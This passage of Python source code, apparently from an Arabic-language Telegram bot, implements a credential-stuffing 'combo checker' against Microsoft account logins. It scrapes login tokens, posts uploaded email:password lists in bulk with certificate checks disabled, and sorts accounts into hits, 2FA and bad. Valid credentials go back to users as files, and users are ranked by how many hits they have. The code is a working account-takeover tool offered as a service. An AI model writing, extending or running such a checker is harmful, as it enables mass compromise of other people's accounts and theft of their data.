            json.dump(users_cache, f, indent=2, ensure_ascii=False)
        cache_dirty = False

def get_user_data(user_id):
    with users_cache_lock:
        return users_cache.get(str(user_id), {})

def update_user_data(user_id, **kwargs):
    global cache_dirty
    with users_cache_lock:
        uid = str(user_id)
        if uid not in users_cache:
            users_cache[uid] = {"first_join": datetime.now().isoformat(), "total_hits": 0, "language": "ar", "subscribed": False}
        for key, value in kwargs.items():
            users_cache[uid][key] = value
        cache_dirty = True

def is_user_banned(user_id):
    return get_user_data(user_id).get("banned", False)

def get_user_lang(user_id):
    return get_user_data(user_id).get("language", "ar")

def has_language_set(user_id):
    return "language" in get_user_data(user_id)

def is_user_subscribed(user_id):
    return get_user_data(user_id).get("subscribed", False)

def set_user_subscribed(user_id, status):
    update_user_data(user_id, subscribed=status)

def t(user_id, key, *args, **kwargs):
    lang = get_user_lang(user_id)
    val = TEXTS.get(lang, TEXTS["ar"]).get(key)
    if callable(val):
        return val(*args, **kwargs)
    return val

def periodic_save_background():
    while True:
        time.sleep(60)
        if cache_dirty:
            save_users_data()

# ═══════════════════ دوال الأزرار الملونة ═══════════════════
async def send_colored_buttons(chat_id, text, buttons, message_id=None):
    inline_keyboard = []
    for row in buttons:
        keyboard_row = []
        for btn in row:
            btn_dict = {"text": btn["text"], "callback_data": btn["callback_data"]}
            if "style" in btn: btn_dict["style"] = btn["style"]
            if "icon_custom_emoji_id" in btn: btn_dict["icon_custom_emoji_id"] = btn["icon_custom_emoji_id"]
            keyboard_row.append(btn_dict)
        inline_keyboard.append(keyboard_row)
    
    reply_markup = {"inline_keyboard": inline_keyboard}
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "reply_markup": reply_markup}
    if message_id:
        payload["message_id"] = message_id
        url = API_URL + "editMessageText"
    else:
        url = API_URL + "sendMessage"
    
    try:
        response = await async_client.post(url, json=payload, timeout=60.0)
        return response.json()
    except Exception as e:
        print(f"Error sending colored buttons: {e}")
        return None

async def check_channel_membership(user_id):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChatMember"
        params = {"chat_id": CHANNEL_USERNAME, "user_id": user_id}
        response = await async_client.get(url, params=params, timeout=30.0)
        if response.status_code == 200:
            data = response.json()
            if data.get("ok"):
                status = data.get("result", {}).get("status")
                if status in ["creator", "administrator", "member"]:
                    return True
        return False
    except Exception:
        return False

# ═══════════════════ دوال الفحص الأساسية ═══════════════════
def get_login_data(session):
    try:
        text = session.get(SFTTAG_URL, timeout=30.0).text
        sFTTag = re.search(r'value=\\\"(.+?)\\\"', text, re.S).group(1)
        urlPost = re.search(r'"urlPost":"(.+?)"', text, re.S).group(1)
        return urlPost, sFTTag, session
    except:
        return None, None, session

def _check_account_core(username, password):
    result = {'status': 'BAD', 'email': username, 'password': password, 'is_2fa': False, 'platforms': []}
    session = httpx.Client(timeout=httpx.Timeout(60.0, connect=30.0), verify=False, http2=True, follow_redirects=True)
    urlPost, sFTTag, session = get_login_data(session)
    if not urlPost or not sFTTag:
        return result
    data = {'login': username, 'loginfmt': username, 'passwd': password, 'PPFT': sFTTag}
    try:
        req = session.post(urlPost, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, timeout=30.0)
        if '#' in str(req.url) and str(req.url) != SFTTAG_URL:
            fragment = urlparse(str(req.url)).fragment
            token = parse_qs(fragment).get('access_token', ["None"])[0]
            if token != "None":
                result['status'] = 'HIT'
                result['platforms'] = sync_check_platforms(username)
                return result
        if any(x in req.text for x in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
            result['status'] = '2FA'
            result['is_2fa'] = True
            return result
        if any(x in req.text.lower() for x in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
            result['status'] = 'BAD'
            return result
        result['status'] = 'BAD'
        return result
    except Exception:
        result['status'] = 'BAD'
        return result

def check_single_account(username, password):
    return _check_account_core(username, password)

def check_account_combo(session: CheckerSession, username: str, password: str, user_id: int):
    if not session.is_running:
        return
    res = _check_account_core(username, password)
    with session.lock:
        if res['status'] == 'HIT':
            session.hit += 1
            session.processed += 1
            platforms = res.get('platforms', [])
            platforms_str = ", ".join(platforms) if platforms else t(user_id, "no_platforms")
            line = f"{username}:{password} -> {platforms_str}\n"
            with session.buffer_lock:
                session.hits_buffer.append(line)
                if len(session.hits_buffer) >= session.buffer_size:
                    flush_buffer(session, 'hit')
        elif res['status'] == '2FA':
            session.two_fa += 1
            session.processed += 1
            with session.buffer_lock:
                session.twofa_buffer.append(f"{username}:{password}\n")
                if len(session.twofa_buffer) >= session.buffer_size:
                    flush_buffer(session, 'twofa')
        elif res['status'] == 'BAD' or res['status'] == 'LOCKED':
            session.bad += 1
            session.processed += 1
            with session.buffer_lock:
                extra = " [LOCKED]" if res['status'] == 'LOCKED' else ""
                session.bad_buffer.append(f"{username}:{password}{extra}\n")
                if len(session.bad_buffer) >= session.buffer_size:
                    flush_buffer(session, 'bad')
        else:
            session.retry += 1
            session.processed += 1

def flush_buffer(session, buf_type):
    if buf_type == 'hit' and session.hits_file and not session.hits_file.closed:
        session.hits_file.writelines(session.hits_buffer)
        session.hits_buffer.clear()
    elif buf_type == 'twofa' and session.two_fa_file and not session.two_fa_file.closed:
        session.two_fa_file.writelines(session.twofa_buffer)
        session.twofa_buffer.clear()
    elif buf_type == 'bad' and session.bad_file and not session.bad_file.closed:
        session.bad_file.writelines(session.bad_buffer)
        session.bad_buffer.clear()

def flush_all_buffers(session):
    with session.buffer_lock:
        if session.hits_buffer:
            flush_buffer(session, 'hit')
        if session.twofa_buffer:
            flush_buffer(session, 'twofa')
        if session.bad_buffer:
            flush_buffer(session, 'bad')

def build_progress_bar(current, total):
    if total == 0: return "▱▱▱▱▱▱▱▱▱▱ 0%"
    pct = min(int((current/total)*100), 100)
    filled = pct // 10
    empty = 10 - filled
    return f"<code>{'▰'*filled}{'▱'*empty}</code> <b>{pct}%</b>"

def format_live_message(session):
    bar = build_progress_bar(session.processed, session.total)
    elapsed = time.time() - session.start_time
    speed = int((session.processed / max(elapsed, 1)) * 60)
    return t(session.user_id, "checking_progress", session.hit, session.bad, session.two_fa, session.retry, speed, bar)

async def update_progress_message(session, bot, chat_id, msg_id):
    if not session.is_running or not msg_id:
        return
    new_text = format_live_message(session)
    if new_text != session.last_progress_text:
        buttons = [[{"text": t(session.user_id, "cancel_check"), "callback_data": f"cancel_check_{session.user_id}", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}]]
        try:
            await send_colored_buttons(chat_id, new_text, buttons, message_id=msg_id)
            session.last_progress_text = new_text
        except Exception as e:
            print(f"[Progress] Error updating progress for user {session.user_id}: {e}")

# ═══════════════════ دالة تشغيل فحص الملف ═══════════════════
async def run_combo_checker(session, lines, bot, chat_id, progress_msg_id):
    session.is_running = True
    session.start_time = time.time()
    session.total = len(lines)
    user_dir = f"Results/{session.user_id}"
    os.makedirs(user_dir, exist_ok=True)
    os.makedirs("Accounts", exist_ok=True)
    
    hits_filename = t(session.user_id, "hits_file")
    twofa_filename = t(session.user_id, "2fa_file")
    bad_filename = t(session.user_id, "bad_file")
    session.hits_file = open(f"{user_dir}/{hits_filename}", "w", encoding="utf-8")
    session.two_fa_file = open(f"{user_dir}/{twofa_filename}", "w", encoding="utf-8")
    session.bad_file = open(f"{user_dir}/{bad_filename}", "w", encoding="utf-8")

    loop = asyncio.get_running_loop()
    batches = [lines[i:i+BATCH_SIZE] for i in range(0, len(lines), BATCH_SIZE)]
    executor = ThreadPoolExecutor(max_workers=MAX_WORKERS)

    async def progress_updater():
        while session.is_running and session.processed < session.total:
            await asyncio.sleep(UPDATE_INTERVAL)
            if not session.is_running: break
            await update_progress_message(session, bot, chat_id, progress_msg_id)

    progress_task = asyncio.create_task(progress_updater())

    for batch in batches:
        if not session.is_running: break
        tasks = []
        for line in batch:
            parts = line.split(":",1)
            if len(parts)==2:
                email, pwd = parts[0].strip(), parts[1].strip()
                if email and pwd:
                    tasks.append(loop.run_in_executor(executor, check_account_combo, session, email, pwd, session.user_id))
        await asyncio.gather(*tasks, return_exceptions=True)
        flush_all_buffers(session)

    session.is_running = False
    progress_task.cancel()
    try: await progress_task
    except asyncio.CancelledError: pass

    flush_all_buffers(session)

    for f in [session.hits_file, session.two_fa_file, session.bad_file]:
        if f and not f.closed: f.close()
    try:
        executor.shutdown(wait=False)
    except:
        pass

    try:
        await send_combo_results(session, bot)
    except Exception as e:
        print(f"[Combo Check] Error sending results for user {session.user_id}: {e}")
    
    try:
        await bot.delete_message(chat_id=chat_id, message_id=progress_msg_id)
    except:
        pass
    
    # حذف الجلسة لهذا المستخدم
    if session.user_id in user_sessions:
        del user_sessions[session.user_id]
    
    # إلغاء تحديد المستخدم الحالي كـ checking
    global currently_checking_file
    currently_checking_file = None
    
    # فحص الطابور - بدء فحص المستخدم التالي إن وجد
    await process_file_queue(bot)


async def send_combo_results(session, bot):
    user_id = session.user_id
    user_dir = f"Results/{user_id}"
    file_pairs = [
        (t(user_id, "hits_file"), t(user_id, "file_hits")),
        (t(user_id, "2fa_file"), t(user_id, "file_2fa")),
        (t(user_id, "bad_file"), t(user_id, "file_bad"))
    ]
    for filename, caption in file_pairs:
        path = os.path.join(user_dir, filename)
        if os.path.exists(path) and os.path.getsize(path)>0:
            try:
                with open(path,"rb") as f:
                    await bot.send_document(chat_id=user_id, document=f, caption=caption, filename=filename, parse_mode=constants.ParseMode.HTML)
            except Exception as e:
                print(f"[Results] Error sending file {filename}: {e}")
    
    try:
        total_hits = get_user_data(user_id).get("total_hits", 0) + session.hit
        update_user_data(user_id, total_hits=total_hits)
    except Exception as e:
        print(f"[Results] Error updating user data for {user_id}: {e}")
    try:
        summary = t(user_id, "done_summary", session.hit, session.two_fa, session.bad, session.retry)
        await bot.send_message(chat_id=user_id, text=summary, parse_mode=constants.ParseMode.HTML)
    except Exception as e:
        print(f"[Results] Error sending summary for {user_id}: {e}")

# ═══════════════════ طابور فحص الملفات ═══════════════════
async def process_file_queue(bot):
    """فحص الطابور وبدء فحص المستخدم التالي إن وجد"""
    global currently_checking_file
    
    with file_queue_lock:
        if not file_queue or currently_checking_file is not None:
            return
        # أخذ أول مستخدم من الطابور
        entry = file_queue.pop(0)
        currently_checking_file = entry["user_id"]
    
    user_id = entry["user_id"]
    lines = entry["lines"]
    chat_id = entry["chat_id"]
    waiting_msg_id = entry.get("waiting_msg_id")
    
    # حذف رسالة الانتظار إن وجدت
    if waiting_msg_id:
        try:
            await bot.delete_message(chat_id=chat_id, message_id=waiting_msg_id)
        except:
            pass
    
    # إرسال رسالة التنظيف
    cleaning_text = f"<b><blockquote>{E_CLEAN} {t(user_id, 'cleaning_file')}</blockquote></b>"
    cleaning_msg_id = None
    try:
        cleaning_msg = await bot.send_message(chat_id=user_id, text=cleaning_text, parse_mode=constants.ParseMode.HTML)
        cleaning_msg_id = cleaning_msg.message_id
        await asyncio.sleep(2)
    except Exception as e:
        print(f"[Queue Process] Error with cleaning message for user {user_id}: {e}")
    
    if cleaning_msg_id:
        try:
            await bot.delete_message(chat_id=user_id, message_id=cleaning_msg_id)
        except Exception as e:
            print(f"[Queue Process] Error deleting cleaning message for user {user_id}: {e}")
    
    # إنشاء جلسة جديدة للمستخدم
    session = CheckerSession(user_id)
    session.mode = 'full_file'
    session.waiting_for = None
    user_sessions[user_id] = session
    
    # إرسال رسالة التقدم
    text = format_live_message(session)
    buttons = [[{"text": t(user_id, "cancel_check"), "callback_data": f"cancel_check_{user_id}", "style": "danger", "icon_custom_emoji_id": "5870734657384877785"}]]
    try:
        result = await send_colored_buttons(user_id, text, buttons)
        if result and result.get('ok'):
            session.progress_msg_id = result.get('result', {}).get('message_id')
        else:
            msg = await bot.send_message(chat_id=user_id, text=text, parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "cancel_check"), callback_data=f"cancel_check_{user_id}")]]))
            session.progress_msg_id = msg.message_id
    except Exception as e:
        print(f"[Queue Process] Error sending progress for user {user_id}: {e}")
        try:
            msg = await bot.send_message(chat_id=user_id, text=text, parse_mode=constants.ParseMode.HTML)
            session.progress_msg_id = msg.message_id
        except:
            pass
    session.last_progress_text = ""
    
    # بدء الفحص
    await run_combo_checker(session, lines, bot, user_id, session.progress_msg_id)


# ═══════════════════ أمر TOP (خاص بالمالك فقط) ═══════════════════
@owner_only
async def top_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    with users_cache_lock:
        sorted_users = sorted(
            [(uid, data.get("total_hits", 0), data.get("username", None)) for uid, data in users_cache.items()],
            key=lambda x: x[1],
            reverse=True
        )
    
    if not sorted_users:
        await update.message.reply_text(t(user_id, "top_empty"), parse_mode=constants.ParseMode.HTML)
        return
    
    context.user_data['top_list'] = sorted_users
    context.user_data['top_page'] = 0
    await send_top_page(update, context, 0)

async def send_top_page(update_or_query, context, page):
    if isinstance(update_or_query, Update):
        user_id = update_or_query.effective_user.id
        chat_id = update_or_query.message.chat.id
        message_id = None
    else:
        user_id = update_or_query.from_user.id
        chat_id = update_or_query.message.chat.id
        message_id = update_or_query.message.message_id
    
    sorted_users = context.user_data.get('top_list', [])
    if not sorted_users:
        return
    
    total_pages = (len(sorted_users) - 1) // TOP_PAGE_SIZE + 1
    if page >= total_pages:
        page = total_pages - 1
    if page < 0:
        page = 0
    
    start = page * TOP_PAGE_SIZE
    end = min(start + TOP_PAGE_SIZE, len(sorted_users))
    
    text = t(user_id, "top_title")
    for idx, (uid, hits, username) in enumerate(sorted_users[start:end], start=start+1):
        if username:
            display = f"@{username}"
        else:
            display = f"User {uid}"
        text += t(user_id, "top_entry", idx, display, uid, hits)
    
    text += f"\n{t(user_id, 'top_page', page+1, total_pages)}"
    
    buttons = []
    nav_row = []
    if page > 0:
        nav_row.append({"text": f"{E_PREV} {t(user_id, 'prev')}", "callback_data": f"top_prev_{page-1}", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"})
    if page < total_pages - 1:
        nav_row.append({"text": f"{t(user_id, 'next')} {E_NEXT}", "callback_data": f"top_next_{page+1}", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"})
    if nav_row:
        buttons.append(nav_row)
    buttons.append([{"text": t(user_id, "back_to_main"), "callback_data": "main_menu", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"}])
    
    if isinstance(update_or_query, Update):
        await send_colored_buttons(chat_id, text, buttons)
    else:
        await send_colored_buttons(chat_id, text, buttons, message_id)

# ═══════════════════ القوائم والتنقلات ═══════════════════
def build_main_menu_buttons(user_id):
    return [
        [{"text": t(user_id, "check"), "callback_data": "full_check", "style": "danger", "icon_custom_emoji_id": "5445023138297447592"}],
        [{"text": t(user_id, "commands"), "callback_data": "commands_menu", "style": "success", "icon_custom_emoji_id": "5188161072971939376"}],
        [{"text": t(user_id, "settings"), "callback_data": "settings_menu", "style": "primary", "icon_custom_emoji_id": "5445347129155419150"}]
    ]

def build_full_menu_buttons(user_id):
    return [
        [{"text": t(user_id, "single_account"), "callback_data": "full_single", "style": "primary", "icon_custom_emoji_id": "5798659067433980717"}],
        [{"text": t(user_id, "file"), "callback_data": "full_file", "style": "success", "icon_custom_emoji_id": "6026239398650056451"}],
        [{"text": t(user_id, "back_to_main"), "callback_data": "main_menu", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"}]
    ]

def build_settings_buttons(user_id):
    return [
        [{"text": t(user_id, "change_lang"), "callback_data": "change_lang", "style": "success", "icon_custom_emoji_id": "5447510826304959724"}],
        [{"text": t(user_id, "back_to_main"), "callback_data": "main_menu", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"}]
    ]

def build_lang_buttons():
    return [
        [{"text": TEXTS["ar"]["arabic"], "callback_data": "lang_ar", "style": "primary", "icon_custom_emoji_id": "5222032499328190642"},
         {"text": TEXTS["en"]["english"], "callback_data": "lang_en", "style": "danger", "icon_custom_emoji_id": "6026257901369168205"}]
    ]

def build_subscribe_buttons():
    return [
        [{"text": TEXTS["en"]["channel_button"], "callback_data": "open_channel", "style": "success", "icon_custom_emoji_id": "5296369303661067030"},
         {"text": TEXTS["en"]["confirm_button"], "callback_data": "confirm_subscribe", "style": "primary", "icon_custom_emoji_id": "5319082718514915605"}]
    ]

async def show_main_menu(update_or_query):
    if isinstance(update_or_query, Update):
        user = update_or_query.effective_user
        user_id = user.id
        chat_id = update_or_query.message.chat.id
        text = t(user_id, "welcome", user.first_name)
        buttons = build_main_menu_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons)
    else:
        user = update_or_query.from_user
        user_id = user.id
        chat_id = update_or_query.message.chat.id
        message_id = update_or_query.message.message_id
        text = t(user_id, "welcome", user.first_name)
        buttons = build_main_menu_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons, message_id)

async def show_full_menu(update_or_query):
    if isinstance(update_or_query, Update):
        user_id = update_or_query.effective_user.id
        chat_id = update_or_query.message.chat.id
        text = t(user_id, "choose_method")
        buttons = build_full_menu_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons)
    else:
        user_id = update_or_query.from_user.id
        chat_id = update_or_query.message.chat.id
        message_id = update_or_query.message.message_id
        text = t(user_id, "choose_method")
        buttons = build_full_menu_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons, message_id)

async def show_settings_menu(update_or_query):
    if isinstance(update_or_query, Update):
        user_id = update_or_query.effective_user.id
        chat_id = update_or_query.message.chat.id
        text = t(user_id, "settings_title")
        buttons = build_settings_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons)
    else:
        user_id = update_or_query.from_user.id
        chat_id = update_or_query.message.chat.id
        message_id = update_or_query.message.message_id
        text = t(user_id, "settings_title")
        buttons = build_settings_buttons(user_id)
        await send_colored_buttons(chat_id, text, buttons, message_id)

async def show_commands_menu(update_or_query):
    if isinstance(update_or_query, Update):
        user_id = update_or_query.effective_user.id
        chat_id = update_or_query.message.chat.id
    else:
        user_id = update_or_query.from_user.id
        chat_id = update_or_query.message.chat.id
        message_id = update_or_query.message.message_id
    
    is_owner = user_id in OWNER_IDS
    text = t(user_id, "commands_title")
    user_cmds = t(user_id, "user_commands")
    text += f"<blockquote>{t(user_id, 'user_commands_title')}\n{user_cmds}</blockquote>\n"
    if is_owner:
        owner_cmds = t(user_id, "owner_commands")
        text += f"<blockquote>{t(user_id, 'owner_commands_title')}\n{owner_cmds}</blockquote>\n"
    
    buttons = [[{"text": t(user_id, "back_to_main"), "callback_data": "main_menu", "style": "primary", "icon_custom_emoji_id": "6206505206197261313"}]]
    
    if isinstance(update_or_query, Update):
        await send_colored_buttons(chat_id, text, buttons)
    else:
        await send_colored_buttons(chat_id, text, buttons, message_id)

# ═══════════════════ دالة start ═══════════════════
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_user_banned(user_id):
        try:
            await update.message.reply_text(t(user_id, "banned"), parse_mode=constants.ParseMode.HTML)
        except:
            pass
        return
    if BOT_CLOSED and user_id not in OWNER_IDS:
        try:
            await update.message.reply_text(t(user_id, "maintenance"), parse_mode=constants.ParseMode.HTML)
        except:
            pass
        return
    
    # /start يعمل دائماً لكل المستخدمين - لا يؤثر على فحص أي مستخدم آخر
    # لا نحذف الجلسة النشطة حتى لا نقاطع فحص المستخدم
    
    try:
        if update.effective_user.username:
            update_user_data(user_id, username=update.effective_user.username)
    except:
        pass
    
    try:
        if has_language_set(user_id):
            lang = get_user_lang(user_id)
            if lang == "en" and not is_user_subscribed(user_id):
                text = t(user_id, "subscribe_required")
                buttons = build_subscribe_buttons()
                await send_colored_buttons(update.message.chat.id, text, buttons)
                return
            await show_main_menu(update)
        else:
            update_user_data(user_id, first_join=datetime.now().isoformat(), total_hits=0, language="ar")
            text = TEXTS["ar"]["choose_lang"]
            buttons = build_lang_buttons()
            await send_colored_buttons(update.message.chat.id, text, buttons)
    except Exception as e:
        print(f"[Start] Error for user {user_id}: {e}")
        try:
            await update.message.reply_text(t(user_id, "welcome", update.effective_user.first_name), parse_mode=constants.ParseMode.HTML)
        except:
            pass

# ═══════════════════ أوامر المستخدمين ═══════════════════
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
        await update.message.reply_text(t(user_id, "subscribe_required"), parse_mode=constants.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"),
                                                InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]]))
        return
    user_data = get_user_data(user_id)
    first_join_raw = user_data.get("first_join", "")
    if first_join_raw:
        try:
            dt = datetime.fromisoformat(first_join_raw)
            first_join = dt.strftime("%Y-%m-%d %H:%M:%S")
        except:
            first_join = first_join_raw
    else:
        first_join = "غير معروف"
    total_hits = user_data.get("total_hits", 0)
    text = t(user_id, "info", user.first_name, user_id, total_hits, first_join)
    await update.message.reply_text(text, parse_mode=constants.ParseMode.HTML)

async def con_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
        await update.message.reply_text(t(user_id, "subscribe_required"), parse_mode=constants.ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}"),
                                                InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]]))
        return
    status = "🟢 Online" if not BOT_CLOSED else "🔴 Maintenance"
    text = t(user_id, "bot_status", status)
    await update.message.reply_text(text, parse_mode=constants.ParseMode.HTML)

# ═══════════════════ أوامر المالك ═══════════════════
@owner_only
async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(t(user_id, "ban_usage"))
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text(t(user_id, "invalid_id"))
        return
    update_user_data(target_id, banned=True)
    await update.message.reply_text(t(user_id, "ban_done", target_id), parse_mode=constants.ParseMode.HTML)

@owner_only
async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(t(user_id, "unban_usage"))
        return
    try:
        target_id = int(args[0])
    except ValueError:
        await update.message.reply_text(t(user_id, "invalid_id"))
        return
    update_user_data(target_id, banned=False)
    await update.message.reply_text(t(user_id, "unban_done", target_id), parse_mode=constants.ParseMode.HTML)

@owner_only
async def con_off_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_CLOSED
    BOT_CLOSED = True
    await update.message.reply_text(t(update.effective_user.id, "con_off_done"), parse_mode=constants.ParseMode.HTML)

@owner_only
async def con_on_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_CLOSED
    BOT_CLOSED = False
    await update.message.reply_text(t(update.effective_user.id, "con_on_done"), parse_mode=constants.ParseMode.HTML)

@owner_only
async def sent_all_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text(t(user_id, "sent_all_usage"))
        return
    msg = " ".join(args)
    with users_cache_lock:
        users_data = users_cache.copy()
    count = 0
    for uid in users_data:
        try:
            await context.bot.send_message(chat_id=int(uid), text=f"{E_SENT_ALL} <b>Message from owner:</b>\n\n{msg}", parse_mode=constants.ParseMode.HTML)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await update.message.reply_text(t(user_id, "sent_all_done", count))

# ═══════════════════ الهاندلرات ═══════════════════
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()
    
    if is_user_banned(user_id):
        await query.edit_message_text(t(user_id, "banned"), parse_mode=constants.ParseMode.HTML)
        return
    if BOT_CLOSED and user_id not in OWNER_IDS:
        await query.edit_message_text(t(user_id, "maintenance"), parse_mode=constants.ParseMode.HTML)
        return

    if query.data.startswith("top_prev_"):
        page = int(query.data.split("_")[2])
        context.user_data['top_page'] = page
        await send_top_page(query, context, page)
        return
    elif query.data.startswith("top_next_"):
        page = int(query.data.split("_")[2])
        context.user_data['top_page'] = page
        await send_top_page(query, context, page)
        return

    if query.data == "lang_ar":
        update_user_data(user_id, language="ar")
        await query.edit_message_text(t(user_id, "language_changed"), parse_mode=constants.ParseMode.HTML)
        await asyncio.sleep(0.3)
        await show_main_menu(query)
        return
    elif query.data == "lang_en":
        update_user_data(user_id, language="en")
        text = t(user_id, "subscribe_required")
        buttons = build_subscribe_buttons()
        await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
        return

    if query.data == "open_channel":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
            [InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]
        ])
        await query.edit_message_text(t(user_id, "subscribe_required"), parse_mode=constants.ParseMode.HTML, reply_markup=keyboard)
        return
    elif query.data == "confirm_subscribe":
        is_member = await check_channel_membership(user_id)
        if is_member:
            set_user_subscribed(user_id, True)
            await query.edit_message_text(t(user_id, "subscribed_success"), parse_mode=constants.ParseMode.HTML)
            await asyncio.sleep(0.5)
            await show_main_menu(query)
        else:
            await query.edit_message_text(
                t(user_id, "not_subscribed"),
                parse_mode=constants.ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(t(user_id, "channel_button"), url=f"https://t.me/{CHANNEL_USERNAME.lstrip('@')}")],
                    [InlineKeyboardButton(t(user_id, "confirm_button"), callback_data="confirm_subscribe")]
                ])
            )
        return

    if query.data == "full_check":
        if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
            text = t(user_id, "subscribe_required")
            buttons = build_subscribe_buttons()
            await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
            return
        await show_full_menu(query)
    elif query.data == "commands_menu":
        if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
            text = t(user_id, "subscribe_required")
            buttons = build_subscribe_buttons()
            await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
            return
        await show_commands_menu(query)
    elif query.data == "settings_menu":
        if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
            text = t(user_id, "subscribe_required")
            buttons = build_subscribe_buttons()
            await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
            return
        await show_settings_menu(query)
    elif query.data == "change_lang":
        lang = get_user_lang(user_id)
        text = TEXTS[lang]["choose_lang"]
        buttons = build_lang_buttons()
        await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
    elif query.data == "full_single":
        if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
            text = t(user_id, "subscribe_required")
            buttons = build_subscribe_buttons()
            await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
            return
        # فحص حساب واحد - يعمل لكل المستخدمين بشكل مستقل
        if user_id in user_sessions and user_sessions[user_id].is_running:
            await query.answer(t(user_id, "check_active"))
            return
        session = CheckerSession(user_id)
        session.mode = 'full_single'
        session.waiting_for = 'full_single_input'
        user_sessions[user_id] = session
        txt = t(user_id, "single_prompt")
        await query.edit_message_text(text=txt, parse_mode=constants.ParseMode.HTML)
    elif query.data == "full_file":
        if get_user_lang(user_id) == "en" and not is_user_subscribed(user_id):
            text = t(user_id, "subscribe_required")
            buttons = build_subscribe_buttons()
            await send_colored_buttons(query.message.chat.id, text, buttons, query.message.message_id)
            return
        # فحص ملف - نسمح بإرسال الملف حتى لو هناك مستخدم يفحص (يدخل الطابور)
        if user_id in user_sessions and user_sessions[user_id].is_running:
            await query.answer(t(user_id, "check_active"))
            return
        session = CheckerSession(user_id)
        session.mode = 'full_file'
        session.waiting_for = 'file_upload'
        user_sessions[user_id] = session
        txt = t(user_id, "file_prompt")
        await query.edit_message_text(text=txt, parse_mode=constants.ParseMode.HTML)
    elif query.data.startswith("cancel_check_"):
        # إلغاء الفحص الخاص بهذا المستخدم
        target_user_id = int(query.data.split("_")[2])
        if target_user_id != user_id:
            await query.answer("لا يمكنك إلغاء فحص مستخدم آخر")
            return
        
        # أولاً: نتحقق إذا كان المستخدم في الطابور (منتظر)
        with file_queue_lock:
            removed_from_queue = False
            for i, entry in enumerate(file_queue):
                if entry["user_id"] == user_id:
                    file_queue.pop(i)
                    removed_from_queue = True
                    waiting_msg_id = entry.get("waiting_msg_id")
                    break
        
        if removed_from_queue:
            # حذف رسالة الانتظار
            try:
                await query.message.chat.delete_message(message_id=waiting_msg_id)
            except:
                pass
            await query.answer(t(user_id, "cancel_success"))
            if user_id in user_sessions:
                del user_sessions[user_id]
            return
        
        # ثانياً: نتحقق إذا كان المستخدم يفحص حالياً
        session = user_sessions.get(user_id)
        if session and session.is_running:
            session.is_running = False
            await query.answer(t(user_id, "cancel_success"))
        else:
            await query.answer(t(user_id, "no_active_check"))
    elif query.data == "main_menu":
        await show_main_menu(query)
    elif query.data == "check_another":
        if user_id in user_sessions: del user_sessions[user_id]
        session = CheckerSession(user_id)
        session.mode = 'full_single'
        session.waiting_for = 'full_single_input'
        user_sessions[user_id] = session
        txt = t(user_id, "single_prompt")
        await query.edit_message_text(text=txt, parse_mode=constants.ParseMode.HTML)

def make_button(text, emoji_id=None, fallback_emoji=None, **kwargs):
    button_kwargs = {}
    if emoji_id:
        button_kwargs['icon_custom_emoji_id'] = emoji_id
        button_kwargs['text'] = text
    elif fallback_emoji:
